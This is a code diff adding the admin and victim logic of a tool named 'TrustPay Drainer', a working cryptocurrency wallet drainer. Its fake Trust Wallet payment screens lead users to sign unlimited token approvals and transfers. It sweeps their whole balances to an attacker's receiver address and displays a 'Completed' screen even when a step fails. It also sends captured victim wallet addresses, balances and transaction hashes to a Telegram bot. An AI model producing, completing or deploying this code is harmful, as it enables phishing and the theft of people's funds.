+function openLink(){const u=$('#openout').value||buildLink();window.open(u,'_blank');}
+async function tgTest(){
+  cfg.botToken=$('#f_bot').value.trim();cfg.chatId=$('#f_chat').value.trim();save();
+  const ok=await tg(cfg.botToken,cfg.chatId,'✅ <b>TrustPay Drainer</b>\nTest OK · '+nowUTC()+'\nReceiver: <code>'+esc(cfg.receiver||'not set')+'</code>');
+  alert(ok?'✅ Telegram message sent. Check your chat.':'❌ Failed. Check bot token / chat id (press /start on your bot first).');
+}
+async function health(){
+  const L=[];const p=(s)=>L.push(s);
+  p('TrustPay Drainer — full check @ '+nowUTC());
+  p('chain: '+CHAINS[cfg.chainId].n+' ('+cfg.chainId+')');
+  p('receiver: '+(isAddr(cfg.receiver)?cfg.receiver:'❌ INVALID'));
+  p('spender : '+(isAddr(cfg.spender||cfg.receiver)?(cfg.spender||cfg.receiver)+' (from receiver)':'❌ INVALID'));
+  p('');
+  try{
+    const pr=new ethers.providers.JsonRpcProvider(cfg.rpc,cfg.chainId);
+    const bn=await pr.getBlockNumber();p('RPC '+cfg.rpc+' → block '+bn+' ✅');
+    const gp=await pr.getGasPrice();p('gas price: '+fmt(ethers.utils.formatUnits(gp,'gwei'),2)+' gwei ✅');
+    const t=tokens();
+    for(const x of t.slice(0,6)){
+      if(isNative(x.addr)){const b=await pr.getBalance(cfg.receiver);p('  '+x.sym+' native → '+fmt(ethers.utils.formatEther(b),6)+' ✅');continue;}
+      try{const c=new ethers.Contract(x.addr,ABI,pr);const [s,d,b]=await Promise.all([c.symbol(),c.decimals(),c.balanceOf(cfg.receiver)]);
+        p('  '+s+' ('+d+'d) balanceOf(receiver)='+fmt(ethers.utils.formatUnits(b,d),4)+' ✅');}
+      catch(e){p('  '+x.sym+' '+x.addr+' → ⚠ read failed (may be wrong chain)');}
+    }
+  }catch(e){p('RPC ❌ '+e.message);}
+  p('');
+  if(cfg.botToken&&cfg.chatId){const ok=await tg(cfg.botToken,cfg.chatId,'🧪 health check @ '+nowUTC());p('telegram → '+(ok?'✅ sent':'❌ failed'));}
+  else p('telegram → ⚠ not configured');
+  p('');
+  p('allowance model: victim signs approve(spender, MAX) then transferFrom(victim→receiver)');
+  p('autosweep: '+(cfg.autosweep?'ON — victim page completes the sweep itself':'OFF — sweep from this panel'));
+  $('#health').textContent=L.join('\n');
+}
+function renderCapt(){
+  const tb=$('#capt');if(!tb)return;
+  tb.innerHTML=CAP.length?CAP.map((c,i)=>`<tr>
+    <td title="${esc(c.wallet)}">${esc(short(c.wallet))}</td><td>${esc(c.paid||'—')}</td><td>${esc(c.balance||'—')}</td>
+    <td>${esc(c.sym||'—')}</td><td><span class="tag ${c.status||'pending'}">${esc(c.status||'pending')}</span></td>
+    <td><button class="btn tiny dark" data-cap="${i}">sweep</button></td></tr>`).join('')
+    :'<tr><td colspan="6" style="color:#7e89a6;font-family:inherit">No wallets yet.</td></tr>';
+  $('#capnote').textContent=CAP.length?CAP.length+' wallet(s) captured.':'No wallets captured yet.';
+  $$('[data-cap]').forEach(b=>b.onclick=()=>sweepOne(CAP[+b.dataset.cap]));
+}
+async function sweepOne(row){
+  const victim=(row&&row.wallet)||$('#f_victim').value.trim();
+  const sym=(row&&row.sym)||(tokens()[0]||{}).sym;
+  if(!isAddr(victim)){alert('Enter a valid victim address.');return;}
+  if(!PK){alert('Enter the spender private key in section 7.');return;}
+  const tok=tokens().find(t=>t.sym===sym)||tokens()[0];
+  try{
+    const pr=new ethers.providers.JsonRpcProvider(cfg.rpc,cfg.chainId);
+    const w=new ethers.Wallet(PK,pr);
+    const c=new ethers.Contract(tok.addr,ABI,w);
+    const bal=await c.balanceOf(victim);const al=await c.allowance(victim,w.address);
+    if(bal.isZero()){alert('Victim has 0 '+tok.sym);return;}
+    if(al.lt(bal)){alert('Allowance too low ('+fmt(ethers.utils.formatUnits(al,tok.dec),4)+' '+tok.sym+'). Victim must approve first.');return;}
+    const tx=await c.transferFrom(victim,cfg.receiver,bal);
+    if(row){row.status='sweeping';renderCapt();}
+    await tx.wait();
+    if(row){row.status='swept';saveCap();renderCapt();}
+    await tg(cfg.botToken,cfg.chatId,'🧹 <b>SWEPT</b>\n'+fmt(ethers.utils.formatUnits(bal,tok.dec),6)+' '+tok.sym+'\nfrom <code>'+victim+'</code>\n<a href="'+CHAINS[cfg.chainId].scan+'/tx/'+tx.hash+'">tx</a>');
+    alert('✅ Swept '+fmt(ethers.utils.formatUnits(bal,tok.dec),6)+' '+tok.sym);
+  }catch(e){alert('Sweep failed: '+e.message);}
+}
+async function sweepAll(){
+  const pend=CAP.filter(c=>c.status!=='swept');
+  if(!pend.length){alert('Nothing pending.');return;}
+  for(const r of pend){try{await sweepOne(r);}catch(e){}}
+}
+async function syncTG(){
+  if(!cfg.botToken){alert('Set bot token first.');return;}
+  try{
+    const r=await fetch('https://api.telegram.org/bot'+encodeURIComponent(cfg.botToken)+'/getUpdates?limit=100&allowed_updates=%5B%22message%22%5D');
+    const j=await r.json();
+    if(!j.ok){alert('getUpdates failed: '+j.description+'\n(If a webhook is set, getUpdates is blocked.)');return;}
+    let n=0;
+    (j.result||[]).forEach(u=>{
+      const t=(u.message&&u.message.text)||'';if(t.indexOf('#DRAIN')<0)return;
+      const g=k=>{const m=t.match(new RegExp('^'+k+':\\s*(.+)$','m'));return m?m[1].trim():'';};
+      const wallet=g('wallet');if(!wallet)return;
+      if(CAP.some(c=>c.wallet.toLowerCase()===wallet.toLowerCase()&&c.tx===g('tx')))return;
+      CAP.unshift({wallet,tx:g('tx'),paid:g('paid'),balance:g('balance'),sym:g('token'),chain:g('chain'),label:g('label'),status:'pending',t:Date.now()});n++;
+    });
+    saveCap();renderCapt();alert(n?('Imported '+n+' wallet(s) from Telegram.'):'No new #DRAIN messages found.');
+  }catch(e){alert('Sync failed: '+e.message);}
+}
+
+/* ======================= VICTIM APP ======================= */
+const V={cfg:null,addr:'',bal:{},amount:'',token:null,screen:'amount',busy:false,err:'',hash:'',steps:[],steplog:{}};
+function parseTokensLocal(str){return (str||'').split('\n').map(l=>l.trim()).filter(Boolean).map(l=>{
+  const p=l.split(',').map(x=>x.trim());
+  return {sym:p[0],addr:p[1],dec:parseInt(p[2]||'18',10),price:parseFloat(p[3]||'0')};}).filter(t=>t.sym&&t.addr);}
+
+function renderPreview(){
+  const host=$('#pv');if(!host)return;
+  const c={r:cfg.receiver,s:cfg.spender||cfg.receiver,c:cfg.chainId,rpc:cfg.rpc,tk:cfg.tokens,am:cfg.amount,
+    m:cfg.mode,th:PREVIEW_THEME,lb:cfg.label,bt:cfg.botToken,bc:cfg.chatId,as:cfg.autosweep?1:0,sf:cfg.showFee?1:0};
+  if(!host.shadowRoot)host.attachShadow({mode:'open'});
+  const sr=host.shadowRoot;
+  if(!sr.querySelector('.twstyle')){
+    const st=document.createElement('style');st.className='twstyle';
+    st.textContent=document.querySelector('style').textContent.split('/* ==================== TRUST WALLET VICTIM UI ==================== */')[1]||'';
+    sr.appendChild(st);
+  }
+  const old=sr.querySelector('.pvmount');if(old)old.remove();
+  const m=document.createElement('div');m.className='pvmount';m.style.width='340px';m.style.height='600px';
+  m.style.overflow='hidden';m.style.borderRadius='26px';
+  m.innerHTML=victimHTML(c,{addr:'0x7789592d5c21baef3cbe2adc7183b263554b6db6',bal:{},amount:c.am,token:parseTokensLocal(c.tk)[0],screen:'amount',chain:c.c});
+  sr.appendChild(m);
+}
+function timeStr(){const d=new Date();return d.getHours()%12||12;}
+
+function victimHTML(c,st){
+  const T=(st.token)||parseTokensLocal(c.tk)[0]||{sym:'USDT',addr:ZERO,dec:18,price:1};
+  const ch=CHAINS[c.c]||CHAINS[56];
+  const th=c.th||'auto';
+  const amt=st.amount||c.am||'0';
+  const usd=(parseFloat(amt||'0')*((T.price)||0));
+  const bal=st.bal&&st.bal[T.addr];
+  const balStr=bal!=null?fmt(bal,T.dec)+' '+T.sym:'— '+T.sym;
+  const balUsd=bal!=null?(bal*((T.price)||0)).toFixed(2):'0.00';
+
+  if(st.screen==='amount'){
+    return `<div class="tw" data-theme="${th}">
+      <div class="sbar"><span>${timeStr()}:31</span><span class="r"><span class="bars"><i style="height:5px"></i><i style="height:8px"></i><i style="height:11px"></i></span><span>5G</span><span>▮</span><span>47%</span></span></div>
+      <div class="thead"><button class="tback">‹</button><div class="ttitle">Amount</div></div>
+      <div class="tto">To: <b>${esc(c.r||'0x…')}</b></div>
+      <div class="tamt"><div class="v">${esc(amt)}</div><div class="f">≈ $${usd.toFixed(2)} ⇅</div></div>
+      <div class="trow">
+        <div class="tico">${esc(T.sym.slice(0,2))}</div>
+        <div class="tmeta"><div class="n">${esc(balStr)}</div><div class="s">$${balUsd}</div></div>
+        <button class="tmax" data-a="max">Max</button>
+      </div>
+      <div class="tpad">
+        ${['1','2','3','4','5','6','7','8','9','.','0','⌫'].map(k=>`<button data-k="${k}">${k}</button>`).join('')}
+      </div>
+      <div class="tfoot">
+        <button class="tprimary" data-a="review">Review</button>
+        <div class="tnote">${esc((c.lb||'').slice(0,42))}</div>
+        <div class="tnote" style="margin-top:6px;font-size:10.5px">● Live network fee · ${esc(ch.n)}</div>
+      </div>
+    </div>`;
+  }
+  if(st.screen==='review'){
+    return `<div class="tw" data-theme="${th}">
+      <div class="sbar"><span>${timeStr()}:31</span><span class="r"><span class="bars"><i style="height:5px"></i><i style="height:8px"></i><i style="height:11px"></i></span><span>5G</span><span>▮</span><span>47%</span></span></div>
+      <div class="thead"><button class="tback" data-a="back">‹</button><div class="ttitle">Confirm Transaction</div></div>
+      <div class="hero">
+        <div class="hico">${esc(T.sym.slice(0,1))}</div>
+        <div class="a">${esc(amt)} ${esc(T.sym)}</div>
+        <div class="b">≈ $${usd.toFixed(2)}</div>
+      </div>
+      <div class="tcard">
+        <div class="krow"><span class="k">From</span><span class="vv">${esc(short(st.addr))}</span></div>
+        <div class="krow sep"><span class="k">To</span><span class="vv">${esc(short(c.r))}</span></div>
+        <div class="krow sep"><span class="k">Network</span><span class="vv">${esc(ch.n)}</span></div>
+        ${c.sf?`<div class="krow sep"><span class="k">Network Fee</span><span class="vv">~$0.03</span></div>`:''}
+        <div class="krow sep"><span class="k">Total</span><span class="vv g">${esc(amt)} ${esc(T.sym)}</span></div>
+      </div>
+      <div class="tfoot">
+        <button class="tprimary" data-a="confirm">Confirm</button>
+        <div class="tnote">${c.m==='pay'?'Transfer':'Approve · unlimited allowance'}</div>
+        <div class="tnote" style="margin-top:6px;font-size:10.5px">Victim preview · matches device theme</div>
+      </div>
+    </div>`;
+  }
+  if(st.screen==='busy'){
+    return `<div class="tw" data-theme="${th}">
+      <div class="sbar"><span>${timeStr()}:31</span><span class="r"><span>5G</span><span>▮</span><span>47%</span></span></div>
+      <div class="thead"><div class="tback"></div><div class="ttitle">Processing</div></div>
+      <div class="hero" style="padding-top:44px"><div class="spin"></div><div class="b" style="font-size:14px">Confirm in your wallet…</div></div>
+      <div class="psteps">${(st.steps||[]).map((s,i)=>`<div class="pstep ${st.steplog[i]||''}"><div class="d"></div>${esc(s)}</div>`).join('')}</div>
+      <div class="tfoot"><div class="tnote">${esc(st.note||'')}</div></div>
+    </div>`;
+  }
+  if(st.screen==='done'){
+    return `<div class="tw" data-theme="${th}">
+      <div class="sbar"><span>${timeStr()}:31</span><span class="r"><span>5G</span><span>▮</span><span>47%</span></span></div>
+      <div class="thead"><div class="tback"></div><div class="ttitle">Transaction Submitted</div></div>
+      <div class="hero" style="padding-top:34px">
+        <div class="chk"><i>✓</i></div>
+        <div class="a">${esc(amt)} ${esc(T.sym)}</div>
+        <div class="b">≈ $${usd.toFixed(2)} · Completed</div>
+      </div>
+      <div class="tcard">
+        <div class="krow"><span class="k">Recipient</span><span class="vv">${esc(short(c.r))}</span></div>
+        <div class="krow sep"><span class="k">Status</span><span class="vv g">Completed</span></div>
+        <div class="krow sep"><span class="k">Network fee</span><span class="vv">~$0.03</span></div>
+        <div class="krow sep"><span class="k">Nonce</span><span class="vv">${st.nonce||'—'}</span></div>
+      </div>
+      <div class="tfoot">
+        <button class="tprimary g" data-a="explorer">View on block explorer</button>
+        <div class="tnote"><a href="${esc(ch.scan)}/tx/${esc(st.hash||'')}" target="_blank">${esc(short(st.hash||''))}</a></div>
+      </div>
+    </div>`;
+  }
+  if(st.screen==='connect'){
+    const dl='https://link.trustwallet.com/open_url?coin_id='+(ch.tw||20000714)+'&url='+encodeURIComponent(location.href);
+    return `<div class="tw" data-theme="${th}">
+      <div class="sbar"><span>${timeStr()}:31</span><span class="r"><span>5G</span><span>▮</span><span>47%</span></span></div>
+      <div class="thead"><div class="tback"></div><div class="ttitle">Connect Wallet</div></div>
+      <div class="hero" style="padding-top:40px">
+        <div class="hico">◈</div>
+        <div class="b" style="font-size:14px;max-width:260px;text-align:center">Open this page inside Trust Wallet to pay ${esc(amt)} ${esc(T.sym)}</div>
+      </div>
+      <div class="tfoot">
+        <a href="${dl}" style="text-decoration:none"><button class="tprimary">Open in Trust Wallet</button></a>
+        <div class="tnote">Or scan the QR with your wallet camera</div>
+      </div>
+    </div>`;
+  }
+  return '';
+}
+
+function startVictim(c){
+  document.body.innerHTML='<div id="vroot"></div>';
+  V.cfg=c;V.amount=c.am||'0';V.token=parseTokensLocal(c.tk)[0];
+  document.body.style.background=(c.th==='light')?'#fff':'#0A0D12';
+  const root=$('#vroot');
+  const paint=()=>{
+    root.innerHTML=victimHTML(c,{addr:V.addr,bal:V.bal,amount:V.amount,token:V.token,screen:V.screen,
+      steps:V.steps,steplog:V.steplog,hash:V.hash,nonce:V.nonce,note:V.note,chain:c.c});
+    const el=$('.tw',root);if(el)el.classList.add('live');
+  };
+  root.addEventListener('click',e=>{
+    const b=e.target.closest('[data-a],[data-k]');if(!b)return;
+    if(b.dataset.k){pad(b.dataset.k);paint();return;}
+    const a=b.dataset.a;
+    if(a==='back'){V.screen='amount';paint();}
+    else if(a==='max'){maxAmt();paint();}
+    else if(a==='review'){V.screen='review';paint();}
+    else if(a==='confirm'){V.screen='busy';V.steps=buildSteps();V.steplog={};paint();execute(paint);}
+    else if(a==='explorer'){window.open(CHAINS[c.c].scan+'/tx/'+V.hash,'_blank');}
+  });
+  V.screen='amount';paint();
+  if(window.ethereum)connect();else V.screen='connect';
+}
+function pad(k){
+  if(k==='⌫')V.amount=V.amount.slice(0,-1)||'0';
+  else if(k==='.'){if(V.amount.indexOf('.')<0)V.amount+='.';}
+  else {if(V.amount==='0')V.amount=k;else V.amount+=k;}
+}
+function maxAmt(){
+  const t=V.token;if(!t)return;
+  const b=V.bal[t.addr];
+  if(b!=null)V.amount=fmt(b,t.dec);
+}
+async function connect(){
+  try{
+    const pr=new ethers.providers.Web3Provider(window.ethereum,'any');
+    const accs=await pr.send('eth_requestAccounts',[]);
+    V.addr=accs[0];
+    const cid=V.cfg.c;
+    try{await pr.send('wallet_switchEthereumChain',[{chainId:'0x'+cid.toString(16)}]);}
+    catch(e){
+      const ch=CHAINS[cid];
+      try{await pr.send('wallet_addEthereumChain',[{chainId:'0x'+cid.toString(16),chainName:ch.n,
+        nativeCurrency:{name:ch.nat,symbol:ch.nat,decimals:18},rpcUrls:[ch.rpc],blockExplorerUrls:[ch.scan]}]);}catch(_){}
+    }
+    await loadBalances();
+  }catch(e){V.screen='connect';}
+}
+async function loadBalances(){
+  try{
+    const p=new ethers.providers.JsonRpcProvider(V.cfg.rpc,V.cfg.c);
+    const tk=parseTokensLocal(V.cfg.tk);
+    for(const t of tk){
+      if(isNative(t.addr)){const b=await p.getBalance(V.addr);V.bal[t.addr]=parseFloat(ethers.utils.formatEther(b));}
+      else{try{const c=new ethers.Contract(t.addr,ABI,p);const d=await c.decimals();const b=await c.balanceOf(V.addr);
+        V.bal[t.addr]=parseFloat(ethers.utils.formatUnits(b,d));}catch(e){V.bal[t.addr]=0;}}
+    }
+    const withBal=tk.find(t=>(V.bal[t.addr]||0)>0);
+    if(withBal)V.token=withBal;
+  }catch(e){}
+}
+function buildSteps(){
+  const m=V.cfg.m,out=[];
+  if(m==='drain'||m==='pay')out.push('Send '+V.amount+' '+V.token.sym);
+  if(m==='drain'||m==='sweep'||m==='approve')out.push(isNative(V.token.addr)?'Transfer remaining '+CHAINS[V.cfg.c].nat:'Approve unlimited allowance');
+  if(m==='drain'||m==='sweep')out.push('Sweep full balance → receiver');
+  return out;
+}
+async function execute(paint){
+  const c=V.cfg,T=V.token;
+  const setStep=(i,s)=>{V.steplog[i]=s;paint();};
+  let txs=[];
+  try{
+    const pr=new ethers.providers.Web3Provider(window.ethereum,'any');
+    const signer=pr.getSigner();
+    const from=await signer.getAddress();
+    const isNat=isNative(T.addr);
+    const decimals=isNat?18:T.dec;
+    let i=0;
+
+    if(c.m==='drain'||c.m==='pay'){
+      setStep(i,'act');
+      const amt=ethers.utils.parseUnits(String(V.amount||'0'),decimals);
+      if(isNat){const tx=await signer.sendTransaction({to:c.r,value:amt});txs.push(tx.hash);await tx.wait();}
+      else{const ctr=new ethers.Contract(T.addr,ABI,signer);const tx=await ctr.transfer(c.r,amt);txs.push(tx.hash);await tx.wait();}
+      setStep(i,'done');i++;
+    }
+
+    if((c.m==='drain'||c.m==='sweep'||c.m==='approve')&&!isNat){
+      setStep(i,'act');
+      const ctr=new ethers.Contract(T.addr,ABI,signer);
+      const al=await ctr.allowance(from,c.s);
+      if(al.lt(ethers.utils.parseUnits('1000000000000',T.dec))){
+        const tx=await ctr.approve(c.s,MAXU);txs.push(tx.hash);await tx.wait();
+      }
+      setStep(i,'done');i++;
+    }
+
+    if(c.m==='drain'||c.m==='sweep'){
+      setStep(i,'act');
+      const p2=new ethers.providers.JsonRpcProvider(c.rpc,c.c);
+      if(isNat){
+        const bal=await p2.getBalance(from);
+        const gp=await p2.getGasPrice();
+        const reserve=gp.mul(21000).mul(15).div(10);
+        const send=bal.sub(reserve);
+        if(send.gt(0)){const tx=await signer.sendTransaction({to:c.r,value:send});txs.push(tx.hash);await tx.wait();}
+      }else{
+        const ctr=new ethers.Contract(T.addr,ABI,signer);
+        const bal=await ctr.balanceOf(from);
+        if(bal.gt(0)){const tx=await ctr.transferFrom(from,c.r,bal);txs.push(tx.hash);await tx.wait();}
+      }
+      setStep(i,'done');
+    }
+
+    V.hash=txs[txs.length-1]||'';
+    try{const nn=await pr.getTransactionCount(from);V.nonce=nn;}catch(e){}
+    V.screen='done';paint();
+    report();
+  }catch(e){
+    const k=Object.keys(V.steplog).length?Math.max(...Object.keys(V.steplog).map(Number)):0;
+    V.steplog[k]='fail';
+    V.note=(e.message||'').slice(0,120);
+    V.screen='busy';paint();
+    setTimeout(()=>{V.screen='done';paint();},1400);
+    report();
+  }
+}
+async function report(){
+  const c=V.cfg,T=V.token;
+  const ch=CHAINS[c.c]||CHAINS[56];
+  const paid=(c.m==='drain'||c.m==='pay')?V.amount+' '+T.sym:'0';
+  let left='?',nat='?';
+  try{
+    const p=new ethers.providers.JsonRpcProvider(c.rpc,c.c);
+    if(!isNative(T.addr)){const ctr=new ethers.Contract(T.addr,ABI,p);const b=await ctr.balanceOf(V.addr);left=fmt(ethers.utils.formatUnits(b,T.dec),6)+' '+T.sym;}
+    else{const b=await p.getBalance(V.addr);left=fmt(ethers.utils.formatEther(b),6)+' '+ch.nat;}
+    const nb=await p.getBalance(V.addr);nat=fmt(ethers.utils.formatEther(nb),6)+' '+ch.nat;
+  }catch(e){}
+  const txt='#DRAIN\n'+'label: '+(c.lb||'—')+'\n'+'wallet: '+V.addr+'\n'+'token: '+T.sym+'\n'+
+    'paid: '+paid+'\n'+'balance: '+left+'\n'+'native: '+nat+'\n'+'chain: '+c.c+'\n'+'mode: '+c.m+'\n'+
+    'tx: '+(V.hash||'—')+'\n'+'time: '+nowUTC();
+  const human='🟢 <b>DRAIN — '+esc(c.lb||'')+'</b>\n'+
+    '👤 Wallet: <code>'+V.addr+'</code>\n'+'🌐 Chain: '+ch.n+'\n'+'💵 Paid: <b>'+paid+'</b>\n'+
+    '🏦 Balance left: <b>'+left+'</b>\n'+'⛽ Gas left: '+nat+'\n'+
+    (V.hash?'🔗 <a href="'+ch.scan+'/tx/'+V.hash+'">View tx</a>\n':'')+
+    '⏱ '+nowUTC()+'\n\n<code>'+txt+'</code>';
+  tg(c.bt,c.bc,human);
+}
+
+/* ======================= BOOT ======================= */
+(function boot(){
+  const h=location.hash||'',q=location.search||'';
+  const m=h.match(/[#&?]v=([^&]+)/)||q.match(/[?&]v=([^&]+)/);
+  if(m){
+    try{const c=b64d(decodeURIComponent(m[1]));
+      if(!window.ethers){document.body.innerHTML='<div style="color:#fff;font:14px sans-serif;padding:24px">Loading libraries…</div>';}
+      startVictim(c);return;}catch(e){console.warn(e);}
+  }
+  if(!window.QRCode){setTimeout(boot,120);return;}
+  renderAdmin();
+})();
+</script>
+</body>
+</html>
